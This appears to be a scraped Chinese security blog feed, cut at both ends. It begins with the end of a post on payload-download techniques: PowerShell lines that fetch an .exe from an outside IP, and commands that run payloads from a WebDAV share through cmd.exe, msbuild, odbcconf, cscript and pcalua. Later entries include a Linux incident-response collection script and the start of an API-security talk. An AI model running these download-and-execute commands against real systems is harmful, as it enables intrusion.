\\webdavserver\folder\payload.ps1远程执行命令：powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile( ‘http://<span class="number">192.168</span>.<span class="number">168.183</span>/<span class="number">1</span>.exe’,’C:\<span class="number">111111111111111</span>.exe’)powershell -w hidden -c (<span class="built_in">new-object</span> System.Net.WebClient).Downloadfile(<span class="string">'http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg'</span>,<span class="string">'d:\\1.jpg'</span>)</span><br></pre></td></tr></table></figure><h2><span id="unc">UNC</span></h2><h3><span id="ipc">ipc$</span></h3><p>ipc$（net user）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#建立远程IPC连接<span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">28</span>.<span class="number">128</span>\ipc$ /user:administrator "abc123!"#复制远程文件到本地主机<span class="built_in">copy</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">28</span>.<span class="number">128</span>\c$\<span class="number">2</span>.txt D:\test</span><br></pre></td></tr></table></figure><h3><span id="copy">copy</span></h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> \\x.x.x.x\xx\poc.exexcopy d:\test.exe  \\x.x.x.x\test.exe</span><br></pre></td></tr></table></figure><h3><span id="cmdexe">cmd.exe</span></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /k <span class="tag">&lt; \\<span class="attr">webdavserver</span>\<span class="attr">folder</span>\<span class="attr">batchfile.txt</span></span></span><br></pre></td></tr></table></figure><p><img src="image-20210714173344492.png" alt="image-20210714173344492"></p><h3><span id="msbuild">msbuild</span></h3><p>cmd /V /c “set MB=”C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe” &amp; !MB! /noautoresponse /preprocess \webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml” </p><h3><span id="odbcconf">odbcconf</span></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf /s /a &#123;regsvr \\webdavserver\folder\payload_dll.txt&#125;</span><br></pre></td></tr></table></figure><h3><span id="cscript">cscript</span></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //E:jscript \\webdavserver\folder\payload.txt</span><br></pre></td></tr></table></figure><h3><span id="pcalua">pcalua</span></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcalua.exe -a \\server\payload.dll</span><br></pre></td></tr></table></figure><h1><span id="参考">参考</span></h1><h2><span id="url">URL</span></h2><p><a href="https://www.cnblogs.com/xiaozi/p/12721960.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/12721960.html</a></p><p><a href="https://www.cnblogs.com/backlion/p/7908563.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/7908563.html</a></p><p><a href="https://blog.csdn.net/qq_27446553/article/details/78694506" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/78694506</a></p><p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats</a> 无文件攻击</p><p><a href="https://paper.seebug.org/1103/" target="_blank" rel="noopener">https://paper.seebug.org/1103/</a>  ATT&amp;CK 之防御逃逸</p><table><thead><tr><th>战术</th><th>MITRE ATT&amp;CK链接</th></tr></thead><tbody><tr><td>XSL脚本代码代理执行</td><td><a href="https://attack.mitre.org/techniques/T1220/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1220/</a></td></tr><tr><td>利用可信网络服务进行数据隐蔽传输</td><td><a href="https://attack.mitre.org/techniques/T1102/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1102/</a></td></tr><tr><td>虚拟化和沙箱的检测</td><td><a href="https://attack.mitre.org/techniques/T1497" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1497</a></td></tr><tr><td>受信任的开发人员实用程序利用</td><td><a href="https://attack.mitre.org/techniques/T1127/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1127/</a></td></tr><tr><td>时间戳伪装</td><td><a href="https://attack.mitre.org/techniques/T1099/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1099/</a></td></tr><tr><td>PubPrn代理脚本代码执行</td><td><a href="https://attack.mitre.org/techniques/T1216/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1216/</a></td></tr><tr><td>签名二进制程序代理执行</td><td><a href="https://attack.mitre.org/techniques/T1218/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1218/</a></td></tr><tr><td>Regsvr32代理代码执行</td><td><a href="https://attack.mitre.org/techniques/T1117/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1117/</a></td></tr><tr><td>进程注入</td><td><a href="https://attack.mitre.org/techniques/T1055/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1055/</a></td></tr><tr><td>利用NTFS ADS进行数据隐藏</td><td><a href="https://attack.mitre.org/techniques/T1096/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1096/</a></td></tr><tr><td>Mshta代理执行脚本代码</td><td><a href="https://attack.mitre.org/techniques/T1170/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1170/</a></td></tr><tr><td>CHM文件隐藏代码执行</td><td><a href="https://attack.mitre.org/techniques/T1223/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1223/</a></td></tr><tr><td>CMSTP配置文件参数利用</td><td><a href="https://attack.mitre.org/techniques/T1191/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1191/</a></td></tr><tr><td>本机程序编译代码执行</td><td><a href="https://attack.mitre.org/techniques/T1500/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1500/</a></td></tr><tr><td>额外窗口内存注入</td><td><a href="https://attack.mitre.org/techniques/T1181/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1181/</a></td></tr><tr><td>间接命令执行</td><td><a href="https://attack.mitre.org/techniques/T1202/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1202/</a></td></tr><tr><td>解码文件并执行</td><td><a href="https://attack.mitre.org/techniques/T1140/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1140/</a></td></tr><tr><td>控制面板文件代码执行</td><td><a href="https://attack.mitre.org/techniques/T1196/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1196/</a></td></tr><tr><td>入侵痕迹清除</td><td><a href="https://attack.mitre.org/techniques/T1070/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1070/</a></td></tr><tr><td>文件加壳</td><td><a href="https://attack.mitre.org/techniques/T1045/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1045/</a></td></tr><tr><td>修改文件权限</td><td><a href="https://attack.mitre.org/techniques/T1222/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1222/</a></td></tr></tbody></table><h2><span id="init">INIT</span></h2><ol><li>命令本身可以接受一个HTTP URL作为其中一个参数；</li><li>命令接受一个UNC路径（指向一台WebDAV服务器）；</li><li>命令能够执行一个小型的内联脚本（脚本负责完成下载任务）；</li></ol><p>@subTee</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概览说明&quot;&gt;&lt;a href=&quot;#概览说明&quot; class=&quot;headerlink&quot; title=&quot;概览说明&quot;&gt;&lt;/a&gt;概览说明&lt;/h1&gt;&lt;p&gt;总体来讲高频使用的上线方法包括powershell、rundll32 、regsvr32、mshta，其他根据具体场景进行结合利用（参考免杀），像powershell、wmi都是综合的专题。类似powershell downloadstring、mshta、rundll32 都可以实现内存加载，无文件落地。&lt;/p&gt;
    
    </summary>
    
      <category term="攻防渗透" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="远程下载" scheme="http://yoursite.com/tags/%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>我的公众号</title>
    <link href="http://yoursite.com/2020/05/01/%E6%88%91%E7%9A%84%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    <id>http://yoursite.com/2020/05/01/我的公众号/</id>
    <published>2020-05-01T01:40:12.000Z</published>
    <updated>2022-05-02T01:45:31.825Z</updated>
    
    <content type="html"><![CDATA[<p>我的个人公众号，平常分享一些成长路上的所见所得。</p><p><img src="gzh.jpg" alt></p><p><img src="我的公众号.assets/认知独省公众号.jpg" alt="认知独省公众号"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我的个人公众号，平常分享一些成长路上的所见所得。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;gzh.jpg&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;我的公众号.assets/认知独省公众号.jpg&quot; alt=&quot;认知独省公众号&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="认知独省" scheme="http://yoursite.com/categories/%E8%AE%A4%E7%9F%A5%E7%8B%AC%E7%9C%81/"/>
    
    
  </entry>
  
  <entry>
    <title>红队体系化</title>
    <link href="http://yoursite.com/2019/02/16/%E7%BA%A2%E9%98%9F%E4%BD%93%E7%B3%BB%E5%8C%96/"/>
    <id>http://yoursite.com/2019/02/16/红队体系化/</id>
    <published>2019-02-16T10:47:03.000Z</published>
    <updated>2021-09-02T06:15:49.138Z</updated>
    
    <content type="html"><![CDATA[<p>单点的方法均会向方法论过渡。</p><p>由单维解决方法逐渐向通用解决方案过渡。</p><p>背后的本质都是知识的体系化。框架后再聚焦。</p><a id="more"></a><p>敏捷渗透</p><p><img src="apt.png" alt></p><p>红队体系化</p><p><img src="RedTeam.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;单点的方法均会向方法论过渡。&lt;/p&gt;
&lt;p&gt;由单维解决方法逐渐向通用解决方案过渡。&lt;/p&gt;
&lt;p&gt;背后的本质都是知识的体系化。框架后再聚焦。&lt;/p&gt;
    
    </summary>
    
      <category term="认知独省" scheme="http://yoursite.com/categories/%E8%AE%A4%E7%9F%A5%E7%8B%AC%E7%9C%81/"/>
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>应急分析信息收集linux</title>
    <link href="http://yoursite.com/2018/09/30/%E5%BA%94%E6%80%A5%E5%88%86%E6%9E%90%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86linux/"/>
    <id>http://yoursite.com/2018/09/30/应急分析信息收集linux/</id>
    <published>2018-09-30T15:15:43.000Z</published>
    <updated>2019-02-16T10:46:14.143Z</updated>
    
    <content type="html"><![CDATA[<p>之前写过一篇<a href="https://www.cnblogs.com/shellr00t/p/6943796.html" target="_blank" rel="noopener">《黑客入侵应急分析手工排查》</a>，为了提升排查效率，部分是能够实现自动化的。比如linux的基础信息收集、web日志和系统日志的自动化分析。<br>这次就把之前的命令统一收集起来。本来打算用python写的，发现还是linux默认集成的shell会好一些（对于基础信息收集）<br><a id="more"></a></p><p>这个bash脚本可以后续应急分析排查时做信息收集使用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># by sm0nk</span></span><br><span class="line"><span class="comment"># usage: bash securityCheck.sh &gt;&gt; all.txt &amp;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"start......"</span> `date`</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"basicFile security check"</span></span><br><span class="line">ls -alt /tmp/</span><br><span class="line">ls -alt /etc/init.d/</span><br><span class="line">find ./ -mtime 0 -name <span class="string">"*.jsp"</span></span><br><span class="line">find  /   -perm 4777</span><br><span class="line">netstat -anp</span><br><span class="line">ps -aux</span><br><span class="line">ls -alt /usr/bin   | head -10</span><br><span class="line">ls -alt /usr/sbin   | head -10</span><br><span class="line">ls -alt /sbin   | head -10</span><br><span class="line"><span class="built_in">stat</span> /usr/bin/ls /usr/bin/netstat </span><br><span class="line"><span class="built_in">stat</span> /bin/ls /bin/netstat </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"sysinfo secuity check"</span></span><br><span class="line"><span class="built_in">history</span></span><br><span class="line"><span class="built_in">history</span> | grep wget </span><br><span class="line"><span class="built_in">history</span> | grep ssh</span><br><span class="line">cat /root/.bash_history</span><br><span class="line">crontab -l</span><br><span class="line">ls /etc/cron*</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">ls -alt /etc/init.d/</span><br><span class="line">cat /etc/init.d/rc.local</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user info select"</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">awk -F: <span class="string">'&#123;if($3==0)print $1&#125;'</span> /etc/passwd</span><br><span class="line">cat /etc/passwd  | grep -E <span class="string">"/bin/bash$"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"log info check"</span></span><br><span class="line">last</span><br><span class="line">lastlog</span><br><span class="line">lastb</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line"><span class="comment"># cat /var/log/auth.log</span></span><br><span class="line"><span class="comment"># cat /var/log/auth.log | egrep '[1-9]&#123;1,3&#125;\.[1-9]&#123;1,3&#125;\.'</span></span><br><span class="line"><span class="comment"># cd  /var/log/ &amp;&amp; cat message auth.log userlog cron secure faillog</span></span><br><span class="line"><span class="built_in">cd</span>  /var/<span class="built_in">log</span> &amp;&amp; strings wtmp btmp faillog lastlog  &gt;&gt; /tmp/linuxsys.log</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"login failed IP......"</span></span><br><span class="line">grep <span class="string">"Failed password"</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $13&#125;'</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"login success IP......"</span></span><br><span class="line">grep <span class="string">"Accepted"</span> /var/<span class="built_in">log</span>/auth.log | awk <span class="string">'&#123;print $11&#125;'</span> | sort | uniq -c | sort -nr | more </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"file packet"</span></span><br><span class="line">tar zcPf /tmp/apacheAccess.tar.gz /var/<span class="built_in">log</span>/apache2/access.log</span><br><span class="line">tar zxPf /tmp/nginxAccess.tar.gz /var/<span class="built_in">log</span>/nginx/access.log</span><br><span class="line">tar zcPf /tmp/varALL.tar.gz /var/<span class="built_in">log</span>/</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"end......"</span> `date`</span><br></pre></td></tr></table></figure><p>本来打算是用python写的,奈何subprocess处理 多参数时,代码略显臃肿.但这个模块还是比较值得推荐的.</p><p>例如批量检测c段存活</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_check</span><span class="params">(ip)</span>:</span></span><br><span class="line">check = Popen([<span class="string">'/bin/bash'</span>,<span class="string">'-c'</span>,<span class="string">'ping -c 2 '</span>+ip],stdin=PIPE,stdout=PIPE)</span><br><span class="line">data = check.stdout.read()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'ttl'</span> <span class="keyword">in</span> data : </span><br><span class="line"><span class="keyword">print</span> <span class="string">'%s is up'</span>%ip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">ip = <span class="string">'192.168.0.'</span>+str(i)</span><br><span class="line">thread.start_new_thread(ping_check,(ip,)) <span class="comment">#2.8s</span></span><br><span class="line"><span class="comment"># ping_check(ip)</span></span><br><span class="line">time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>写了一部分的python linux信息收集，虽然改用了bash，但subprocess的用法记录下。</p><ol><li><p>subprocess.check_output ，几个执行命令的参数中例如run call Popen 应该是即写即执行，这个check_output 可以将执行结果存入到变量。但又一个问题有困扰，假如cat /var/log/message 应该是会增加机器的内存开销的…</p></li><li><p>shell=True 用法，可以直接用单引号包裹后，引入系统命令，假如不使用shell=True 需要传入列表形式的命令，例如find  /Users/sm0nk/Downloads -name “find*.txt”，太长了需要使用shlex.split 分割成单点列表</p></li><li><p>管道类多重命令交互，需要两次定义</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip1 = Popen(<span class="string">'ifconfig'</span>,stdout=PIPE)</span><br><span class="line">ip2 = Popen(<span class="string">'grep 192.168.'</span>,stdin=ip1.stdout,stdout=PIPE,shell=True)</span><br><span class="line">out,err = ip2.communicate()</span><br><span class="line"><span class="built_in">print</span> out</span><br></pre></td></tr></table></figure></li><li><p>搜索学习过程，发现cnblog 有个作者写的python的博客，可谓研究者心态。顺便贴个链接。</p></li></ol><p><a href="https://www.cnblogs.com/yyds/p/7288916.html" target="_blank" rel="noopener">Python之系统交互(subprocess)</a></p><p><a href="http://www.cnblogs.com/yyds/" target="_blank" rel="noopener">云游道士</a></p><hr><p>用python写的信息收集半成品，留作备忘。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># emergencySecurity_linux.py</span></span><br><span class="line"><span class="comment"># by sm0nk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess,shlex</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basicFileAnalysis</span><span class="params">()</span>:</span></span><br><span class="line">os.chdir(<span class="string">'/tmp'</span>)</span><br><span class="line">tmplist = subprocess.check_output([<span class="string">'ls -al'</span>],shell=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> tmplist</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.chdir(<span class="string">'/etc/init.d/'</span>)</span><br><span class="line">onstart = subprocess.check_output([<span class="string">'ls -al '</span>],shell=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> onstart</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如要查找24小时内被修改的JSP文件,www目录为核心，操作频繁的目录也需要检查；</span></span><br><span class="line"><span class="comment"># mtime 相对靠谱，linux 没有创建时间</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># os.system("find /var/www -mtime 0 ")</span></span><br><span class="line"><span class="comment"># os.system("find /private/tmp -mtime 0")</span></span><br><span class="line">find_cmd = shlex.split(<span class="string">'find /tmp -mtime 0'</span>)</span><br><span class="line">p1 = subprocess.check_output(find_cmd)</span><br><span class="line"><span class="comment"># p1 = subprocess.check_output('find  /Users/sm0nk/Downloads -name \'find*.txt\'',shell=True)</span></span><br><span class="line"><span class="keyword">print</span> p1</span><br><span class="line"><span class="comment"># ip1 = Popen('ifconfig',stdout=PIPE)</span></span><br><span class="line"><span class="comment"># ip2 = Popen('grep 192.168',stdin=ip1.stdout,stdout=PIPE,shell=True)</span></span><br><span class="line"><span class="comment"># out,err = ip2.communicate()</span></span><br><span class="line"><span class="comment"># print out</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找指定目录大权限文件，/tmp  /var/www等目录</span></span><br><span class="line">permlist =  subprocess.check_output(<span class="string">'find /tmp -perm 777'</span>,shell=<span class="keyword">True</span>)  </span><br><span class="line"><span class="keyword">print</span> permlist </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="comment"># basicFileAnalysis()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">processConn</span><span class="params">()</span>:</span> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">processlist = subprocess.check_output(<span class="string">'ps -aux'</span>,shell=<span class="keyword">True</span>)  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"########## cmd: ps -aux ##########\n"</span>+ processlist</span><br><span class="line">netconn = subprocess.check_output(<span class="string">'netstat -anp'</span>,shell=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"########## cmd: netstat -anp ##########\n"</span> + netconn</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="comment"># processConn()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmdAnalysis</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># 查看命令目录最近的时间排序</span></span><br><span class="line">bincmd1 = subprocess.Popen(<span class="string">'ls -alt /usr/bin '</span>,stdout=PIPE,shell=<span class="keyword">True</span>)</span><br><span class="line">bincmd2 = subprocess.Popen(<span class="string">'head -10'</span>,stdin=bincmd1.stdout,stdout=PIPE,shell=<span class="keyword">True</span>)</span><br><span class="line">out,err = bincmd2.communicate()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"########## cmd: ls -alt /usr/bin   | head -10 ##########\n"</span>,out</span><br><span class="line">bincmd3 = subprocess.Popen(<span class="string">'ls -alt /usr/sbin '</span>,stdout=PIPE,shell=<span class="keyword">True</span>)</span><br><span class="line">bincmd4 = subprocess.Popen(<span class="string">'head -10'</span>,stdin=bincmd3.stdout,stdout=PIPE,shell=<span class="keyword">True</span>)</span><br><span class="line">out4,err = bincmd4.communicate()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"########## cmd: ls -alt /usr/sbin   | head -10 ##########\n"</span>,out4</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line">cmdAnalysis()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前写过一篇&lt;a href=&quot;https://www.cnblogs.com/shellr00t/p/6943796.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《黑客入侵应急分析手工排查》&lt;/a&gt;，为了提升排查效率，部分是能够实现自动化的。比如linux的基础信息收集、web日志和系统日志的自动化分析。&lt;br&gt;这次就把之前的命令统一收集起来。本来打算用python写的，发现还是linux默认集成的shell会好一些（对于基础信息收集）&lt;br&gt;
    
    </summary>
    
      <category term="攻防渗透" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="应急" scheme="http://yoursite.com/tags/%E5%BA%94%E6%80%A5/"/>
    
  </entry>
  
  <entry>
    <title>接口安全道亦有道</title>
    <link href="http://yoursite.com/2018/05/01/%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8%E9%81%93%E4%BA%A6%E6%9C%89%E9%81%93/"/>
    <id>http://yoursite.com/2018/05/01/接口安全道亦有道/</id>
    <published>2018-05-01T00:08:08.000Z</published>
    <updated>2021-07-27T07:54:15.869Z</updated>
    
    <content type="html"><![CDATA[<p>xKungfoo是XCon组委会与北京未来安全信息技术有限公司共同主办的只属于中国人自己的技术交流大会。会议将聚焦当今热点话题，专注于网络安全领域中最新的研究成果和信息交互。xKungfoo的会议精神是为推动中国网络安全技术、攻防技术水平的发展，不断找寻创新想法、经验、解决方案。2018年，xKungfoo将首次在杭州举办！</p><p>x功夫峰会，我分享了关于接口安全的议题，在此我以文字版的形式分享下。<br><a id="more"></a></p><!-- toc --><ul><li><a href="#0x01-为什么单独的讲接口安全">0x01 为什么单独的讲接口安全？</a></li><li><a href="#0x02-什么是接口">0x02 什么是接口？</a></li><li><a href="#0x03-接口有哪些分类">0x03 接口有哪些分类？</a></li><li><a href="#0x04-接口相关案例">0x04 接口相关案例</a></li><li><a href="#0x05-如何获得api地址或uri资源地址">0x05 如何获得API地址或URI资源地址</a></li><li><a href="#0x06-聚合归类">0x06 聚合归类</a></li><li><a href="#0x07-接口安全道法自然">0x07 接口安全道法自然</a></li></ul><!-- tocstop --><h1><span id="0x01-为什么单独的讲接口安全">0x01 为什么单独的讲接口安全？</span></h1><ol><li><p>关于OWASP Top10 2017版的漏洞变化：变化点除了日志监控外就是XXE和反序列化漏洞，其实这两种漏洞的上榜也间接体现了基于微服务架构的快速迭代的一种趋势</p><p><img src="top10.png" alt="52767290833"></p></li><li><p>关于当前安全开发的形态，众多功能为了提供服务方便，均预留接口，但基于接口的认证、访问控制等的安全机制存在机制缺陷以及不安全的调用</p></li><li><p>接口安全存在的意识形态很容易被忽略</p></li></ol><p>曾记否，近段事件的币安平台帐号被盗、以太坊的偷渡漏洞。前者利用高权限的api自动化结合金融打法做空货币高价获利。 后者以JSONRPC接口持续调用转账操作，最后实现恶意转账。都与接口的权限控制有关系。</p><h1><span id="0x02-什么是接口">0x02 什么是接口？</span></h1><p>​    正常的知识逻辑，都要有定义。但传统的开发意义的接口又不足以作为研究的对象，所以梳理了两种类型：</p><ol><li>核心关键资源，凡是资源的调用（CRUD）都与接口有关系</li><li>凡是不是直接连接，需要“桥梁”过渡，均需要接口的辅助</li></ol><h1><span id="0x03-接口有哪些分类">0x03 接口有哪些分类？</span></h1><p>​       按照功能来讲接口类型比较多，并且有对应的漏洞，比如登录接口、支付接口、数据接口等；按照技术来讲其实主要是SOAP、REST、RPC。但归纳到数据形态主要还是XML和JSON。</p><p><img 